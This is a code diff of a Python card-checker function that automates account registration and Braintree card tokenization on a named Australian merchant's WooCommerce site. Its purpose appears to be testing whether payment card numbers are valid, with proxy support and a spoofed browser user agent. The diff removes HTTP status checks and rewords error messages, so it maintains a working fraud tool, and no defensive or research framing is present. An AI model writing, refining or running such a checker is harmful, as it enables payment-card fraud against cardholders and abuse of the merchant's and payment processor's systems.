@@ -21,10 +21,8 @@ def check_card(cc, month, year, cvv, proxy=None):
     ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
 
     try:
-        # ── Step 1: Get registration nonce ──
+        # ── Step 1: Get registration nonce (original never checks status) ──
         resp = s.post('https://www.flagworld.com.au/my-account/', headers={'User-Agent': ua}, timeout=15)
-        if resp.status_code != 200:
-            return False, f"Step 1 failed (HTTP {resp.status_code})"
         reg_nonce = re.search(r'name="woocommerce-register-nonce".*?value="([^"]+)"', resp.text)
         if not reg_nonce:
             return False, "Registration nonce not found"
@@ -58,14 +56,10 @@ def check_card(cc, month, year, cvv, proxy=None):
         }
         resp = s.post('https://www.flagworld.com.au/my-account/add-payment-method/',
                       headers={'User-Agent': ua}, data=reg_data, timeout=15)
-        if resp.status_code != 200:
-            return False, f"Registration failed (HTTP {resp.status_code})"
 
         # ── Step 3: Fetch page to get client token nonce & add-payment-method nonce ──
         resp = s.get('https://www.flagworld.com.au/my-account/add-payment-method/',
                      headers={'User-Agent': ua}, timeout=15)
-        if resp.status_code != 200:
-            return False, f"Get page failed (HTTP {resp.status_code})"
         client_nonce = re.search(r'"client_token_nonce":"([^"]+)"', resp.text)
         add_nonce = re.search(r'id="woocommerce-add-payment-method-nonce".*?value="([^"]+)"', resp.text)
         if not client_nonce or not add_nonce:
@@ -83,8 +77,7 @@ def check_card(cc, month, year, cvv, proxy=None):
                           'User-Agent': ua,
                           'X-Requested-With': 'XMLHttpRequest'
                       }, timeout=15)
-        if resp.status_code != 200:
-            return False, f"Get Braintree token failed (HTTP {resp.status_code})"
+        # original code expects a valid JSON response, ignore status
         try:
             enc = resp.json()['data']
         except Exception:
@@ -122,12 +115,10 @@ def check_card(cc, month, year, cvv, proxy=None):
         }
         resp = s.post('https://payments.braintree-api.com/graphql',
                       headers=bt_headers, json=tokenize_payload, timeout=15)
-        if resp.status_code != 200:
-            return False, f"Tokenization failed (HTTP {resp.status_code})"
         try:
             token = resp.json()['data']['tokenizeCreditCard']['token']
         except Exception:
-            return False, "Could not extract token"
+            return False, "Tokenization failed (check card details / network)"
 
         # ── Step 6: Add payment method ──
         add_data = {
